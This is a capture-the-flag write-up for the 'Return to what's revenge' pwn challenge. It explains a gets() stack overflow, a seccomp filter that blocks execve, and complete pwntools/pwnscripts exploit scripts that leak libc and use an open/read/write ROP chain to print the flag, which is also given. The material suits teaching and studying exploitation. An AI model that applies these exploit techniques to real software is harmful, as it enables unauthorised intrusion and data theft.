# Return to what's revenge [medium]
Author: Faith

*My friends kept making fun of me, so I hardened my program even further!*

The flag is located at /chal/flag.txt.

`nc chal.duc.tf 30006`

Attached files: `return-to-whats-revenge` (sha256: 489734ecb8d2595faf11033f34724171cbb96a15e10183f3b17ef4c7090b8ebc)

#### This challenge was quickly finished with [pwnscripts](https://github.com/152334H/pwnscripts). Try it!

This time I was 4th blood --- things were slowed down a bit because I went to [patch pwnscripts](https://github.com/152334H/pwnscripts/commit/9d3dcd7a4aaf2f10fcf878cd7203a469259d5b58) halfway through.

## Return-to-what?
This challenge is a continuation of [Return to what](NOTE: INSERT LINK HERE), and it'll be helpful to see what's changed from that challenge.

Looking at `main()`, everything looks the same:
```c
void vuln() {
  char name[40]; // [rsp+0h] [rbp-30h]
  puts("Where would you like to return to?");
  gets(name);
}
int main() {
  puts("Today, we'll have a lesson in returns.");
  vuln();
}
```
Checksec hardly looks different too:
```python
[*] 'return-to-whats-revenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
At this point, it's rather tempting to run `return-to-what`'s [exploit code](NOTE: ALSO ADD THIS LINK#Analysis) (with minor edits to match the new binary), and to see if it'll work just-like-that:
```python
from pwnscripts import *
context.binary = 'return-to-whats-revenge'	# Edited
context.libc_database = 'libc-database'

def rop_frame():
    rop = ROP(context.binary)
    rop.raw(b'\0'*0x38)
    return rop

rop = rop_frame()
rop.puts(context.binary.got['puts'])
rop.puts(context.binary.got['gets'])
rop.main()

r = remote('chal.duc.tf', 30006)			# also edited
r.sendlineafter('to?\n', rop.chain())

libc_leaks = {'puts': extract_first_bytes(r.recvline(),6),
              'gets': extract_first_bytes(r.recvline(),6)}
context.libc = context.libc_database.libc_find(libc_leaks)
one_gadget = context.libc.select_gadget(1)

rop = rop_frame()
rop.call(one_gadget+context.libc.address)
rop.raw(b'\0'*99)
r.sendlineafter('to?\n', rop.chain())
r.interactive()
```
Unfortunately, the exploit code doesn't seem to pass:
```
$ python3.8 example.py
[*] Loaded 14 cached gadgets for 'return-to-whats-revenge'
[+] Opening connection to chal.duc.tf on port 30006: Done
[*] found libc! id: libc6_2.27-3ubuntu1_amd64
[*] 'libc-database/db/libc6_2.27-3ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```
Although the GOT table leak still works fine, the exploit dies when it tries to call the `one_gadget`<sup>1</sup>. The libc version hasn't changed, so why does this happen?

## SECure COMPuting
Going back to the decompiler, I realise that I've missed the function `setup()`, which happens to be called by `.init_array`:
```c
void handler() {
  puts("Time's up");
  exit(0);
}
void setup() {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  signal(14, handler);
  sandbox();
}
```
`return-to-whats-revenge` sets up an alarm to kill the process after a bit (presumably to reduce server load), and makes a call to `sandbox()`. Therein lies the complication:
```c
int bpf_resolve_jumps(bpf_labels *labels, sock_filter *filter, size_t count) {
	... // We can ignore this
}
void sandbox() {
	struct sock_filter filter[25] = {
        /* op,   jt,   jf,     k    */
        {0x20, 0x00, 0x00, 0x00000004},
		...
        {0x06, 0x00, 0x00, 0x00000000},
    };
	struct sock_fprog prog = {
		.len = sizeof(filter)/sizeof(*filter),
		.filter = filter,
	};
	bpf_labels lab;
	memset(&lab, 0, sizeof(lab));
	bpf_resolve_jumps(&lab, filter, 0x19);
	prctl(PR_SET_NO_NEW_PRIVS, 1);
	prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, prog);
}
```
If you're experienced enough, you might spot that `sandbox()` is applying a whole bunch of [seccomp filters](https://www.yangyang.cloud/blog/2019/12/12/linux-seccomp-filters/)<sup>2</sup> to the binary. Instead of eyeballing the code, we can use a [tool](https://github.com/david942j/seccomp-tools) to help us dump out what all of this code does:
```bash
$ seccomp-tools dump return-to-whats-revenge
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```
The important parts are in the `(A != ...)` statements. `sandbox()` enables a `syscall` filter<sup>2</sup> to block any syscall that doesn't match the ones listed. Our `one_gadget` attempt earlier crashes because it makes a call to `execve`, which in turn is reliant on the `SYS_execve` syscall to work (which is therefore filtered and `KILL`ed by the program).

The (useful) syscalls we have access to are `open`, `read`, `write`, `brk`, `mmap`, and `mprotect`. This challenge reminded me of pwnable.tw's [orw](https://pwnable.tw/challenge/#2) challenge, so I decided that the easiest way to get the flag was to
1. `int fd = open("flag.txt", O_RDONLY)`
2. `read(fd, .bss, 99)`
3. `write(stdout, .bss, 99)`

The implementation for this exploit is actually really simple<sup>3</sup> --- `libc.so.6` provides all the gadgets you could ever need for argument assignment, so finishing up this exploit is really just a matter of abusing pwnscripts' `ROP()` again:
```python
from pwnscripts import *
context.binary = 'return-to-whats-revenge'	# changed
context.libc_database = 'libc-database'

scratch = 0x404100
rop = ROP(context.binary)
rop.raw(b'\0'*0x38)
rop.puts(context.binary.got['puts'])
rop.puts(context.binary.got['gets'])
rop.gets(scratch)	# MODIFIED; used to write "flag.txt"
rop.main()

r = remote('chal.duc.tf', 30006)
r.sendlineafter('to?\n', rop.chain())
libc_leaks = {'puts': extract_first_bytes(r.recvline(),6),
              'gets': extract_first_bytes(r.recvline(),6)}
context.libc = context.libc_database.libc_find(libc_leaks)

# New part of the exploit; this is the 3 step process stated above
r.sendline('flag.txt\0')        # Write flag.txt for later; note MODIFIED comment
READ, WRITE, OPEN = range(3)    # Constants for syscall
rop = ROP(context.libc)         # Use libc for gadgets
rop.raw(b'\0'*0x38)             # overflow here
rop.system_call(OPEN,  [scratch,0],    ret=True) # fd = open("flag.txt", O_RDONLY); ret
rop.system_call(READ,  [3,scratch,40], ret=True) # read(fd, scratch, 40); ret
rop.system_call(WRITE, [1,scratch,40])           # write(fd, scratch, 40);
r.sendlineafter('to?\n', rop.chain())
print(r.recvline())             # get the flag
```

That's it<sup>4</sup>.

## Flag
`DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}`

## Footnotes
1. You can try debugging locally if you want:
   ```python
   r = process('./return-to-whats-revenge', env={"LD_PRELOAD": "./libc-database/db/libc6_2.27-3ubuntu1_amd64.so ./libc-database/libs/libc6_2.27-3ubuntu1_amd64/ld-2.27.so"})
   ```
   Personally, I was unable to verify this while debugging locally. `gdb` appears to have adverse effects on investigating seccomp filters.
2. You can search up what each one does [here](https://syscalls64.paolostivanin.com/)
3. There are actually a few complications that led to deviations in the design of the exploit:
   * Because fd is pretty much *always* going to be 3, I didn't bother copying the return value of `open()`
   * .bss is actually populated with important glibc symbols. Because program initialisation allocates pages of `0x1000`, we can just write to an empty part of memory that is unreferenced in the program (in this case, `0x404100-0x405000` is fully unoccupied and rw)
   * `pwntools` actually has (had, pending [PR](https://github.com/Gallopsled/pwntools/pull/1678)) issues with finding `syscall; ret` gadgets (which are needed for the 3-step ROP chain here), so I had to patch that in as functionality while writing the exploit.
4. In case you try to run this for yourself: because of the pwntools issue stated in (3), the exploit code is definitely not going to run on your machine unless you take the time to install bleeding-edge dev pwntools